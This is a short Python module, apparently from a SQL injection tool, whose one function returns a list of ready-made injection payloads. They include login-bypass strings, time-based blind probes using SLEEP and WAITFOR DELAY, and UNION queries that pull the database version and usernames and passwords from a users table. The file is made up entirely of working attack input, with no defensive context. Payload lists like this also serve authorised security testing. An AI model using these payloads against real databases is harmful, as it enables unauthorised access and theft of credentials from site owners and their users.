# modules/payload_generator.py

def generate_payloads():
    return [
        "' OR SLEEP(5)--",
        '" OR SLEEP(5)--',
        "' OR '1'='1",
        '" OR "1"="1',
        "1 OR 1=1",
        "1' AND SLEEP(5)--",
        "' UNION SELECT NULL, version()--",
        "' UNION SELECT username, password FROM users--",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR IF(1=1, SLEEP(5), 0)--",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 'x'='x",
        "' OR 1=1 LIMIT 1--",
        "' OR 1=1 ORDER BY 1--",
        "' OR EXISTS(SELECT * FROM users)--",
        "' AND ASCII(SUBSTRING(@@version,1,1))=83 AND SLEEP(5)--"
    ]